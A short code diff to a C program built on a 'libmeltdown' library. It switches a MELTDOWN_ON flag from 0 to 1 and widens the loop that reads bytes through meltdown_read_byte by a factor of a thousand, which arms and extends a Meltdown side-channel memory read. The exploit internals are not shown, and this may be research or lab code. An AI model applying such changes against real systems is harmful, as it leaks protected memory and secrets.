@@ -4,7 +4,7 @@
 
 #include "libmeltdown.h"
 
-#define MELTDOWN_ON 0
+#define MELTDOWN_ON 1
 
 /*
   Main Function
@@ -24,7 +24,7 @@ int main(void) {
   }
 
   // doing meltdown
-  for(int i = 100; i < 12421; i++) {
+  for(int i = 100000; i < 12421000; i++) {
     char *p = buffer + i;
 #if MELTDOWN_ON
     char value = meltdown_read_byte(p);
